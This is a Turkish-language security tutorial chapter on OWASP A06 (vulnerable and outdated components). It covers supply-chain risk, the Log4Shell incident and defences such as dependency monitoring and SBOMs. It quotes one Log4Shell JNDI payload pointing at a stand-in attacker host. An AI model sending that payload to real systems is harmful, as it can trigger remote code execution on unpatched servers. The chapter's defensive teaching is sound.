# Bölüm 05: A06 - Vulnerable and Outdated Components (Savunmasız Bileşenler)

Modern yazılımların sadece %10-20'si sizin yazdığınız koddur. Kalan %80-90'ı ise NPM (Node), NuGet (C#) veya Pip (Python) gibi paket yöneticilerinden indirdiğiniz "Başka Geliştiricilerin (Third-Party)" yazdığı hazır kütüphanelerdir (Bileşenler).

Siz kodunuzu mükemmel ve güvenli yazsanız bile, projenizde kullandığınız bir "Resim kırpma eklentisinin" içinde bir açık varsa, hacker o eklenti üzerinden tüm projenize sızabilir. (Buna Supply Chain / Tedarik Zinciri Saldırısı denir).

## 1. Meşhur Tarihi Olay: Log4j Krizi (Log4Shell - 2021)
Dünya üzerindeki Java uygulamalarının ve devasa şirketlerin (Minecraft, Apple, Twitter, Steam) kullandığı "Log4j" adlı basit bir loglama kütüphanesinde inanılmaz bir açık keşfedildi.
Saldırganlar Minecraft'ın chat ekranına bile saçma sapan bir komut `${jndi:ldap://hacker.com/malware}` yazarak koskoca sunucuları ele geçirdiler. Dünyadaki sunucuların yarısı bu "Savunmasız üçüncü parti bileşen" yüzünden haftalarca kapalı kaldı.

## 2. Neden Olur?
- Projeye başlarken bir paket (Örn: `Newtonsoft.Json v10.0`) indirirsiniz ve 5 yıl boyunca projeyi güncellersiniz ama o paketi ASLA güncellemezsiniz. Paketin o versiyonunda açıklar bulunur ama sizin haberiniz olmaz.
- Projede hangi kütüphanelerin kullanıldığına dair bir envanter (Software Bill of Materials - SBOM) tutmazsınız.

## 3. Nasıl Engellenir (Savunma)?

- **Sürekli İzleme (Continuous Monitoring):** Geliştirme ortamınızda (Örn: GitHub) "Dependabot" veya "Snyk" gibi botları açarsınız. Bu botlar projenizin içindeki kütüphaneleri (package.json) her gece okur. Eğer eski bir versiyon varsa size otomatik uyarı maili atar: *"DİKKAT! Kullandığınız 'moment.js' versiyon 2.1'de ölümcül açık bulundu. Lütfen hemen 2.2 sürümüne güncelleyin!"*
- **Sadece Güvenilir Kaynaklar:** GitHub'da 3 yıldızı olan, kimin yazdığı belli olmayan rastgele NPM paketlerini asla ticari projelerinize dahil etmeyin.
- **Kullanılmayanları Silin:** "Belki lazım olur" diye yüklediğiniz ama hiç kodunu yazmadığınız tüm kütüphaneleri projeden (Uninstall) kaldırın. Olmayan bir şey Hacklenemez.
